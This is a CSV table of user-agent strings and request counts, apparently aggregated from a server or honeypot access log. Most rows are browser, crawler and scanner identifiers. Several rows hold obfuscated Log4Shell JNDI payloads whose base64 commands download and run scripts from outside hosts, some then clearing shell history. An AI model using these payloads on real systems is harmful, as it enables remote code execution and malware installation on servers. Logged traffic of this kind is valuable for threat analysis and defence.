,user agent,requests
0,,546
1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",395
2,Mozilla/5.0 zgrab/0.x,177
3,"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30",101
4,"Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com",52
5,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),43
6,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,35
7,"Hello, World",35
8,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",34
9,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",32
10,Go-http-client/1.1,29
11,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),29
12,Mozila/5.0,29
13,python-requests/2.27.1,27
14,https://gdnplus.com:Gather Analyze Provide.,26
15,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,24
16,"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",23
17,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",22
18,masscan/1.3 (https://github.com/robertdavidgraham/masscan),21
19,"Hello, world",21
20,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,19
21,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0),19
22,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0,19
23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0,19
24,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,18
25,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0,17
26,Linux Gnu (cow),17
27,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0,15
28,Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1,14
29,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",13
30,Python-urllib/3.6,13
31,Mozilla/5.0 (compatible;),12
32,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.44",11
33,Python/3.7 aiohttp/3.7.4.post0,11
34,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",11
35,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",10
36,MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24,10
37,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0,10
38,curl/7.75.0,10
39,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",9
40,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",9
41,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",7
42,"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",6
43,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0,6
44,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",6
45,masscan/1.0 (https://github.com/robertdavidgraham/masscan),6
46,curl/7.64.1,5
47,Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0,5
48,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",5
49,Mozilla/5.0,5
50,curl/7.29.0,5
51,AlexaMediaPlayer/2.1.4676.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.9,4
52,gbrmss/7.29.0,4
53,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",4
54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,4
55,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",4
56,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) Project-Resonance (http://project-resonance.com/) (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",4
57,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0,4
58,python-requests/2.26.0,4
59,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",3
60,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",3
61,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",3
62,Anarchy99,3
63,"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",3
64,Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5),3
65,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",3
66,curl/7.58.0,3
67,python-requests/2.24.0,3
68,Roku/DVP-9.10 (289.10E04111A),3
69,masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng),3
70,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",3
71,"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",3
72,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",3
73,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",3
74,Java/1.8.0_321,3
75,Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com),3
76,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",3
77,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",3
78,python-requests/2.22.0,3
79,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",3
80,libwww-perl/6.61,3
81,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0,3
82,Python-urllib/2.7,3
83,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",3
84,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",3
85,"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",3
86,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE",3
87,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0,3
88,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,2
89,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",2
90,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",2
91,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0,2
92,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0",2
93,VLC/3.0.8 LibVLC/3.0.8,2
94,Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729),2
95,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",2
96,Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6),2
97,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",2
98,"Mozilla/5.0 (Linux; Android 6.0; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",2
99,python-requests/2.25.1,2
100,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",2
101,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2
102,l9tcpid/v1.1.0,2
103,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",2
104,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.9 Safari/537.36",2
105,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",2
106,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",2
107,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0,2
108,Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1,2
109,python-requests/2.21.0,2
110,HTTP Banner Detection (https://security.ipip.net),2
111,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",2
112,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",2
113,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",2
114,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",2
115,"Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",2
116,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}'),2
117,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0,2
118,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36",2
119,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",2
120,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",2
121,Mozilla 5/0,2
122,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Spotify / 1.1.39.612 Safari / 537.36",2
123,python-requests/2.9.1,2
124,WinHttpClient,2
125,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}'),2
126,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",2
127,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322),2
128,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com",2
129,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",2
130,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",2
131,libwww-perl/6.35,2
132,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",2
133,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",2
134,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",2
135,Mozilla/5.0 (OS/2; Warp 4.5; rv:45.0) Gecko/20100101 Firefox/45.0 SeaMonkey/2.42.9esr,1
136,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",1
137,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",1
138,Java/1.8.0_312,1
139,"Mozilla/5.01669615 Mozilla/5.0 (Linux; Android 5.1; S900PROBT Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Safari/537.36",1
140,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0",1
141,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3",1
142,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19",1
143,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//82.148.6.126:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNDguMjI0LjI3L3dnZXQuc2g7IGNobW9kICt4IHdnZXQuc2g7IC4vd2dldC5zaDsgcm0gLXJmIHdnZXQuc2g=}'),1
144,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",1
145,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/57.0.3049.96 Safari/537.32",1
146,"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",1
147,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8,1
148,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0",1
149,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2",1
150,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//161.35.0.84:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}'),1
151,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3077.110 Safari/537.32",1
152,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2Ly5rZXkvdXBkYXRlOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvLmtleS91cGRhdGU7IGNobW9kIDc3NyB1cGRhdGU7IC4vdXBkYXRlIHNlcnZlcnMueDg2}'),1
153,"Mozilla/5.0 (Linux; Android 9; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.5 Mobile Safari/537.36",1
154,Nx Witness/4.2.0.34125 (Network Optix) Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0),1
155,"Mozilla/5.0 (Linux; Android 8.1.0; Mi Note 3 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190505 Mobile Safari/537.36 MMWEBID/358 MicroMessenger/7.0.5.1440(0x27000537) Process/tools NetType/4G Language/zh_CN",1
156,curl/7.47.0,1
157,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",1
158,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727),1
159,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),1
160,WebZIP/3.5 (http://www.spidersoft.com),1
161,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//82.148.6.244:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNDguMjI0LjI3L3dnZXQuc2g7IGNobW9kICt4IHdnZXQuc2g7IC4vd2dldC5zaDsgcm0gLXJmIHdnZXQuc2g=}'),1
162,"Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36",1
163,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",1
164,"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",1
165,"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3",1
166,Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0,1
167,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",1
168,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",1
169,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3028.62 Safari/537.32",1
170,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0,1
171,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0),1
172,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",1
173,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",1
174,curl/7.68.0,1
175,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",1
176,"Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3049.98 Safari/537.32",1
177,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36",1
178,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),1
179,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.1 Safari/605.1.15",1
180,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",1
181,Safari/3.0 (Macintosh 4.0; rv:2.0.1) Gecko/20100101 Firefox/3.4.1,1
182,Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0,1
183,Nx Witness/4.2.0.32840 (Network Optix) Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0),1
184,Nx Meta/4.1.0.31466 (Network Optix) Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0),1
185,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",1
186,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",1
187,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0,1
188,POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1,1
189,Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01,1
190,"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/47.0.2526.107 Mobile/12F69 Safari/600.1.4",1
191,"Mozilla/5.0 (Linux; Android 4.4.2; G735-L03 Build/HuaweiG735-L03) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",1
192,Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0,1
193,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//79.141.68.138:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNDguMjI0LjI3L3dnZXQuc2g7IGNobW9kICt4IHdnZXQuc2g7IC4vd2dldC5zaA==}'),1
194,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT.6.2; .NET CLR 3.5.2510; WOW64),1
195,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",1
196,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.828 Yowser/2.5 Safari/537.36",1
197,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36",1
198,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36",1
199,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",1
200,"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/76.0.3809.81 Mobile/15E148 Safari/604.1",1
201,IE/3.0 (Macintosh 4.1; rv:2.0.1) Gecko/20100101 Firefox/4.1.4,1
202,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36",1
203,webprosbot/2.0 (+mailto:abuse-6337@webpros.com),1
204,"Mozilla/6.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",1
205,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2",1
206,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvY2NsZWFyOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9jY2xlYXI7IGNobW9kIDc3NyBjY2xlYXI7IC4vY2NsZWFyIHNlcnZlcnMueDg2}'),1
207,"Mozilla/5.0 (iPad; CPU OS 11_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B101 Safari/604.1",1
208,axios/0.26.1,1
209,"Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1",1
210,"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E233 Safari/601.1",1
211,Mozilla/3.x (I-Opener 1.1; Netpliance),1
212,Mozilla/5.0 agent-eyes4all=4allproject,1
213,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",1
214,"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A405",1
215,"Mozilla/5.0 (iPad; CPU OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15",1
216,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0,1
217,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0),1
